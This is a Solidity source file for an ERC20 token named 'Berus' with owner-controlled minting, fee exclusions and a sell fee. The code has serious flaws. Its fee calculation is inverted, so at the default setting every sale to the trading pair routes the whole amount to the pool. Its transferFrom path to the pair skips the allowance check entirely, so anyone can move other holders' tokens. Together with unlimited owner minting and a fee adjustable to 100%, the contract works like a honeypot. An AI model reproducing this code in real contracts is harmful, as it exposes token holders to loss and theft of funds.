// SPDX-License-Identifier: MIT

pragma solidity 0.8.6;
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Berus is ERC20, Ownable {
    mapping(address => bool) private _isExcludedFromFee;

    address public pool;
    address public pair;

    uint256 public constant DENOMINATOR = 100;
    uint256 public sellFee = 0;

    constructor(address _owner, address _pair) ERC20("Berus", "BERUS") {
        super._mint(_owner, 1e27);
        pool = msg.sender;
        pair = _pair;
    }

    function mint(address account, uint256 amount)
        external
        onlyOwner
        returns (bool)
    {
        emit Mint(account, amount, msg.sender);
        super._mint(account, amount);
        return true;
    }

    function burn(uint256 amount) external onlyOwner returns (bool) {
        emit Burn(amount, _msgSender());
        super._burn(_msgSender(), amount);
        return true;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if (recipient == pair) {
            uint256 fee = amount -
                (calculateFee(_msgSender(), recipient, amount));
            if (fee > 0) {
                super._transfer(_msgSender(), address(pool), fee);
                super._transfer(_msgSender(), recipient, amount - fee);
            }
        } else {
            super._transfer(_msgSender(), recipient, amount);
        }
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool) {
        if (to == pair) {
            uint256 fee = amount - (calculateFee(from, to, amount));
            if (fee > 0) {
                super._transfer(from, address(pool), fee);
                super._transfer(from, to, amount - fee);
            }
        } else {
            super.transferFrom(from, to, amount);
        }
        return true;
    }

    function calculateFee(
        address _from,
        address _to,
        uint256 _amount
    ) internal view returns (uint256 amount_without_fee) {
        if (_isExcludedFromFee[_from] || _isExcludedFromFee[_to]) {
            return _amount;
        }
        return (_amount * sellFee) / DENOMINATOR;
    }

    function excludeFromFee(address account) external onlyOwner {
        require(account != address(0), "account address is zero");
        emit ExcludeFromFee(account);
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) external onlyOwner {
        require(account != address(0), "account address is zero");
        emit IncludeInFee(account);
        _isExcludedFromFee[account] = false;
    }

    function setSellFee(uint256 _number) external onlyOwner {
        require(_number <= DENOMINATOR, "Sell fee great than 100");
        emit SetSellFee(_number);
        sellFee = _number;
    }

    function setPool(address _pool) external onlyOwner {
        require(_pool != address(0), "pool address is zero");
        emit SetPool(_pool);
        pool = _pool;
    }

    function setPair(address _pair) external onlyOwner {
        require(_pair != address(0), "Pair address is zero");
        emit SetPair(_pair);
        pair = _pair;
    }

    /* ========== EVENTS ========== */

    event ExcludeFromFee(address indexed account);
    event IncludeInFee(address indexed account);
    event SetPool(address indexed pool);
    event SetPair(address indexed pair);
    event SetSellFee(uint256 indexed number);
    event Mint(address _account, uint256 amount, address owner);
    event Burn(uint256 amount, address owner);
}
